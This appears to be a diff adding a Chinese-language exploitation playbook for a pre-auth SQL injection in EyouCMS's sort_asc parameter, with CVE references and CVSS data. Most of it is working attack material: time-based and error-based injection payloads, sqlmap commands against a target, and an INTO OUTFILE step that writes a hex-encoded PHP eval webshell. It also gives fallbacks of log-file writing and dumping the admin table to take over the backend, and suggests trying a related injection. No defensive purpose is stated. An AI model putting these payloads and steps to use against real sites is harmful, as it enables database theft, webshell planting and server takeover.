@@ -1,0 +1,64 @@
+== EyouCMS pre-auth SQL 注入（CVE-2026-7389 / CNVD-2026-21568）正文 ==
+
+【漏洞位置】application/common.php :: GetSortData($...)
+  —— 对参数 sort_asc 未做白名单/转义，直接拼进 ORDER BY 子句。
+  该函数被多处列表类接口调用，因此注入面不止一处。
+
+【官方记录】
+  VulDB VDB-360114  https://vuldb.com/vuln/360114
+  Submit #803103    https://vuldb.com/submit/803103
+  厂商 issue（标题即结论）：https://gitee.com/weng_xianhu/eyoucms/issues/IILFPE
+    "[security]eyoucms <= v1.7.9 has Pre-auth SQL Injection Vulnerability in sort_asc Parameter"
+  影响：EyouCMS 1.7.0 / 1.7.1 / 1.7.2 / 1.7.3 / 1.7.4 / 1.7.5 / 1.7.6 / 1.7.7 / 1.7.8 / 1.7.9
+  CVSS 3.1 = 7.3 HIGH（AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L）；CVSS 2.0 = 7.5
+  CISA SSVC：Exploitation=poc，Automatable=yes，Technical Impact=partial
+  厂商状态：尚未发布修复程序（issue 已标记"已完成"但无补丁号）
+
+【注入 payload 模板（ORDER BY 位）】
+  探测：
+    sort_asc=1
+    sort_asc=1'
+    sort_asc=1 AND SLEEP(5)
+    sort_asc=1) AND SLEEP(5)-- -
+    sort_asc=(SELECT 1 FROM (SELECT SLEEP(5))x)
+    sort_asc=1,extractvalue(1,concat(0x7e,version()))     # 报错注入
+    sort_asc=1,updatexml(1,concat(0x7e,database()),1)
+  报错回显：ThinkPHP 5.0.24 默认会抛 SQLSTATE 异常页（若 debug 开启则带回显）
+
+【判定与深利用命令】
+  sqlmap -u 'http://TARGET/<带 sort_asc 的列表URL>' -p sort_asc \
+         --batch --dbms=mysql --level=3 --risk=2 --technique=BEUST --random-agent
+  # 报错注入（若页面回显 SQL 错误，最省包）
+  sqlmap ... --technique=E
+  # 时间盲注（无回显时）
+  sqlmap ... --technique=T --time-sec=5
+
+【一步 getshell（若条件满足）】
+  前提：数据库账号具备 FILE 权限，且 MySQL secure_file_priv 为空。
+  1) 确认：
+     sort_asc=1 AND (SELECT 1 FROM (SELECT @@secure_file_priv)x)
+     sort_asc=1 AND (SELECT 1 FROM (SELECT current_user())x)
+  2) INTO OUTFILE 写马（注意目标绝对路径需先探测，如 /www/wwwroot/xxx/public/）：
+     ... ORDER BY (SELECT 0) INTO OUTFILE '/www/wwwroot/TARGET/public/x.php'
+         LINES TERMINATED BY 0x3c3f70687020406576616c28245f504f53545b615d293b3f3e-- -
+     0x3c3f70687020406576616c28245f504f53545b615d293b3f3e = <?php @eval($_POST[a]);?>
+  3) 若 MySQL >= 5.7 且 secure_file_priv 受限，改用：
+     - 写日志法（general_log / slow_query_log → datadir 下文件）
+     - 或退化为脱库：dump ey_admin 表 → 改管理员口令 → 走后台 getshell
+
+【脱库后接管后台（推荐稳的路）】
+  ey_admin 表存的是管理员账号，口令为易优自研算法（ThinkPHP 默认 md5，易优在
+  application/common.php 里做了二次加盐/拼接）—— 具体实现必须按目标版本读源码确认，
+  不要套用其它 CMS 的口令格式。
+  拿到明文后 → /login.php?m=admin → 后台模板写马（CVE-2026-7388）。
+
+【同族前台注入（一并试，共用 sqlmap 会话）】
+  CVE-2026-13569：/example.com 参数 click_like，影响 1.7.0 / 1.7.1
+    GitHub issue #68: https://github.com/weng-xianhu/eyoucms/issues/68
+    "eyoucms v1.7.1 has SQL injection vulnerability"
+    记录为 CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L（VulDB 侧为 PR:H），实测是否需权限须自行验证。
+
+【注意】
+  上面所有 http://TARGET/... 的路径是"形态模板"，不是实测可用 URL ——
+  GetSortData 的调用点随版本不同（栏目列表 / 搜索页 / 文章列表），
+  实战第一步应先在目标上抓一个带排序参数的列表请求，确认参数名与路由，再上 sqlmap。
